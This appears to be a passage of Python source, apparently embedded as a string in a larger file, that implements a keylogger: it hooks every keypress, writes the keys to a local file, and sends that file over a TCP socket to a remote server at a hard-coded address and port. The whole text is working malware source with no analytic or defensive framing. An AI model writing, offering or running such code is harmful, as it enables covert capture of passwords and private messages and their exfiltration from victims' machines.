import pyautogui
import socket
import keyboard
import os

# File to store keylogs
filename = "keylogs.txt"

# Server address and port
server_ip = "192.168.122.182"
server_port = 9000

# Initialize keylog buffer
keylog_buffer = []

# Function to send keylogs to server
def send_logs():
    try:
        # Create client socket
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, server_port))

        # Send keylogs file
        with open(filename, "rb") as f:
            client.sendall(f.read())

        client.close()
    except Exception as e:
        print(f"Error sending logs: {e}")

# Function to log keystrokes
def log_keystrokes(key):
    keylog_buffer.append(str(key))

    # Write keylogs to file
    with open(filename, "a") as f:
        f.write(str(key))

# Register keylogger
keyboard.on_press(log_keystrokes)

# Start logging
try:
    while True:
        pass
except KeyboardInterrupt:
    pass

# Stop logging and send logs
keyboard.unhook_all()
send_logs()

print("Logs sent to server.")
print("Exiting...")
''',
